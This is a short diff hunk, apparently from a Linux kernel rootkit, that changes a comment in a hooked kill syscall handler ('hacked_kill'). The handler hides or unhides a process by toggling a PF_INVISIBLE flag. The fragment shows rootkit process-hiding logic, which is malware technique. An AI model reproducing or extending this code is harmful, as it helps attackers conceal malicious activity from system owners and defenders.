@@ -1967,7 +1967,7 @@ static asmlinkage int hacked_kill(const struct pt_regs *pt_regs)
         case HIDE_UNHIDE_PROCESS:
           if ((task = find_task(pid)) == NULL)
             return -ESRCH;
-	  // Hiding process using XOR operation
+	  // Hiding/Unhiding process using XOR operation
           task->flags = task->flags ^ PF_INVISIBLE;
 	  /*
 	   * 0 = 1 ^ 1
